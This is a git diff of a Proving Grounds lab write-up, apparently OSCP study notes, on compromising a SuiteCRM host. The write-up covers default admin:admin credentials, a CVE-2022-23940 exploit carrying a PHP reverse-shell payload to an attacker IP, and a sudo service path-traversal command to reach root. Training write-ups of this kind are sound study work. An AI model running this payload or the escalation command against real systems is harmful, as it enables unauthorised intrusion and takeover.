@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-07
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
@@ -63,45 +64,45 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 No enumeration conducted
 ## Port 80 - HTTP (Apache)
 - Navigated to `http://192.168.137.146:80` & identified `SugarCRM`
-![[Pasted image 20241007155353.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007155353.png]]
 - Password guessed `admin:admin` and accessed Admin Dashboard
-![[Pasted image 20241007160513.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007160513.png]]
 - Navigated to "About" and confirmed `SuiteCRM v7.12.3` & `Suger v6.5.25 (Build 344)`
 	- Potentially vulnerable to [`EBD-ID:51187`](https://www.exploit-db.com/exploits/51187) (requires credentials)
 	- Potentially vulnerable to [CVE-2024-36412](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36412)
 	- Potentially vulnerable to [CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940)
-![[Pasted image 20241007161814.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007161814.png]]
 - Inspected `robots.txt`
-![[Pasted image 20241007155610.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007155610.png]]
 - Attempted to navigate to `/ical_server.php`
-![[Pasted image 20241007155653.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007155653.png]]
 - Re-entered `admin:admin` and downloaded `ical_server.ics`
-![[Pasted image 20241007160822.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007160822.png]]
 ## Port 3306 - MYSQL
 - Attempted to re-use `admin:admin` credentials
-![[Pasted image 20241007161053.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007161053.png]]
 
 ---
 # Exploitation
 - Identified exploit for [CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940)
 - Copied exploit, executed against target: 
 `./exploit.py -h http://192.168.137.146/ -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.160\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"`
-![[Pasted image 20241007163321.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007163321.png]]
 - Caught reverse shell with NetCat:
-![[Pasted image 20241007163458.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007163458.png]]
 ---
 # Privilege Escalation
 ## Local Enumeration
 - Upgraded to Full TTY and printed `local.txt`
-![[Pasted image 20241007163641.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007163641.png]]
 - Checked `sudo -l`
-![[Pasted image 20241007163902.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007163902.png]]
 ## Privilege Escalation vector
 - Identified `www-data` can run system services without password
 - Attempted to abuse sudo with directory traversal to maintain privileges: `sudo /usr/sbin/service ../../../../../../../bin/bash`
-![[Pasted image 20241007164937.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007164937.png]]
 - Navigated to `/root` and printed `proof.txt`
-![[Pasted image 20241007165127.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007165127.png]]
 ---
 # Trophy & Loot
 `local.txt` = `2847b6fff8e4463e6cfb2ecae2e0ec97`
